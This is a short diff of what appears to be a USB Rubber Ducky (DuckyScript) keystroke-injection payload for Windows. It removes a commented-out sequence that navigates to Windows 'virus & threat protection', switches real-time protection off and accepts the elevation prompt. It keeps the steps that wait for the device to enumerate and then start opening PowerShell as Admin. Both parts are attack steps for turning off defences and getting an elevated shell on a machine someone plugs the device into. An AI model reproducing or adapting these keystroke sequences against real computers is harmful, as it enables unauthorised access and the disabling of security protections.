@@ -1,26 +1,6 @@
 REM wait for enumaration:
 DELAY 2000
 
-REM disable antivirus
-REM GUI 
-REM DELAY 500
-REM STRING virus & threat protection
-REM ENTER
-REM DELAY 3000
-REM TAB 
-REM TAB
-REM TAB
-REM TAB
-REM DELAY 200
-REM ENTER
-REM DELAY 200
-REM SPACE 
-REM DELAY 3000
-REM ALT y
-REM GUI a
-REM DELAY 200
-REM ALT F4
-
 REM open powershell as Admin:
 GUI r
 DELAY 200
